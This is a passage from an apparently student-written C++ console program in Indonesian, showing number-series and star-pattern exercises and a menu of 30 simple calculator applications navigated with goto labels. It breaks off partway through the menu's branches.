	cout << endl;choosing_in_deret_bilangan_prima_1_sampai_100:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PRODAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto deret_bilangan_prima_1_sampai_100;}
	else if(pilihan == "PRODAS"){system("cls");program_dasar();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_deret_bilangan_prima_1_sampai_100;}return 0;
}
int deret_bilangan_tambah_2()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{
	 int i,a=1,b=2,c;
	 for(i=1;i<=5;i=i++)
	 {
	   printf("%d ",a);
	   printf("%d ",b);
	   c=a+b;
	   printf("%d ",c);
	   a=a+2;
	   b=b+2;
	 }
	 getch();
	}
	*/
	deret_bilangan_tambah_2:system("cls");string pilihan;
	int i,a=1,b=2,c;
	 for(i=1;i<=5;i=i++)
	 {
	   printf("%d ",a);
	   printf("%d ",b);
	   c=a+b;
	   printf("%d ",c);
	   a=a+2;
	   b=b+2;
	 }
	getch();
	cout << endl;
	cout << endl;choosing_in_deret_bilangan_tambah_2:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PRODAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto deret_bilangan_tambah_2;}
	else if(pilihan == "PRODAS"){system("cls");program_dasar();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_deret_bilangan_tambah_2;}return 0;
}
int deret_bintang_1()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{ int n,x=1,y=1,spa;
	clrscr();
	n=5;
	for(x=1;x<=n;x++){
	for(y=1;y<=x;y++){
	printf("*");}
	printf("\n");}

	getch();
	}
	*/
	deret_bintang_1:system("cls");string pilihan;
	int n,x=1,y=1,spa;
	system("cls");
	n=5;
	for(x=1;x<=n;x++){
	for(y=1;y<=x;y++){
	printf("*");}
	printf("\n");}
	getch();
	cout << endl;
	cout << endl;choosing_in_deret_bintang_1:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PRODAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto deret_bintang_1;}
	else if(pilihan == "PRODAS"){system("cls");program_dasar();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_deret_bintang_1;}return 0;
}
int deret_bintang_2()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{ int n,x,y;
	clrscr();
	n=5;
	for(x=1;x<=n;x++){
	for(y=x;y<=n;y++){
	printf(" ");//rata kiri
	}
	for(y=1;y<=x;y++){//ratakanan
	printf("*");}
	printf("\n");}

	 getch();
	}

	*/
	deret_bintang_2:system("cls");string pilihan;
	int n,x,y;
	system("cls");
	n=5;
	for(x=1;x<=n;x++){
	for(y=x;y<=n;y++){
	printf(" ");//rata kiri
	}
	for(y=1;y<=x;y++){//ratakanan
	printf("*");}
	printf("\n");}
	getch();
	cout << endl;
	cout << endl;choosing_in_deret_bintang_2:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PRODAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto deret_bintang_2;}
	else if(pilihan == "PRODAS"){system("cls");program_dasar();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_deret_bintang_2;}return 0;
}
int program_aplikasi()
{
    program_aplikasi:system("cls");string pilihan;
	cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
	cout << "Home >> Program Aplikasi" << endl;
	cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
    cout << endl;
    cout << "Welcome to My Program" << endl;
	cout << "Choose the program" << endl;
	cout << "1.Billing Warung Telekomunikasi" << endl;
	cout << "2.Billing Warung Telekomunikasi 2" << endl;
	cout << "3.Daftar Nilai Mahasiswa" << endl;
	cout << "4.Hitung Cashback Inap Hotel" << endl;
	cout << "5.Hitung Denda Bayar Listrik" << endl;
	cout << "6.Hitung Gaji Karyawan" << endl;
	cout << "7.Hitung Konsumsi Rata-Rata Sepeda" << endl;
	cout << "8.Hitung Lama Pengerjaan Proyek" << endl;
	cout << "9.Hitung Luas Lingkaran" << endl;
	cout << "10.Hitung Luas Segitiga" << endl;
	cout << "11.Hitung Nilai Akhir Mahasiswa" << endl;
	cout << "12.Hitung Nilai Rata-Rata Item" << endl;
	cout << "13.Hitung Perimeter dan Luas Persegi Panjang" << endl;
	cout << "14.Hitung Total Biaya dari Perhitungan Jarak dan Bensin" << endl;
	cout << "15.Hitung Volume Balok" << endl;
	cout << "16.Kalkulator Sederhana" << endl;
	cout << "17.Konversi Angka Ribuan menjadi 4 Pecahan Bilangan" << endl;
	cout << "18.Konversi Hari ke Tahun Minggu dan Hari" << endl;
	cout << "19.Konversi Menit ke Hitungan Jam dan Menit" << endl;
	cout << "20.Konversi Suhu" << endl;
	cout << "21.Mencari Bilangan Terbesar dari 2 Bilangan" << endl;
	cout << "22.Mencari Bilangan Terbesar dari 3 Bilangan" << endl;
	cout << "23.Menentukan Bilangan Ganjil atau Genap" << endl;
	cout << "24.Menentukan Bilangan Positif atau Negatif" << endl;
	cout << "25.Menentukan Kategori Tinggi Badan" << endl;
	cout << "26.Menentukan Kesamaan atau Perbedaan 2 Bilangan Bulat" << endl;
	cout << "27.Pembagian Dengan Pengurangan Berulang" << endl;
	cout << "28.Penempatan String menggunakan Perintah Puts dan Gotoxy" << endl;
	cout << "29.Perkalian 2 Buah Bilangan dengan Menggunakan Konsep Penjumlahan" << endl;
	cout << "30.Program Combine 3 Kasus" << endl;
	cout << endl;
	cout << "Masukkan Pilihan [MAPI] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "MAPI")
    {
        int pilihan;cout << endl;choosing_in_mapi:
        cout << "Masukkan Pilihan : ";cin>>pilihan;
        if(pilihan == 1)
        {
            system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Billing Warung Telekomunikasi" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;billing_warung_telekomunikasi();cout << endl;cout << endl;
        }
        else if(pilihan == 2)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Billing Warung Telekomunikasi 2" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;billing_warung_telekomunikasi_2();cout << endl;cout << endl;
        }
		else if(pilihan == 3)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Daftar Nilai Mahasiswa" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;daftar_nilai_mahasiswa();cout << endl;cout << endl;
        }
		else if(pilihan == 4)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Hitung Cashback Inap Hotel" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;hitung_cashback_inap_hotel();cout << endl;cout << endl;
        }
		else if(pilihan == 5)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Hitung Denda Bayar Listrik" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;hitung_denda_bayar_listrik();cout << endl;cout << endl;
        }
		else if(pilihan == 6)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Hitung Gaji Karyawan" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;hitung_gaji_karyawan();cout << endl;cout << endl;
        }
		else if(pilihan == 7)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Hitung Konsumsi Rata-Rata Sepeda" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;hitung_konsumsi_rata_rata_sepeda();cout << endl;cout << endl;
        }
		else if(pilihan == 8)
        {
			system("cls");int pilihan;
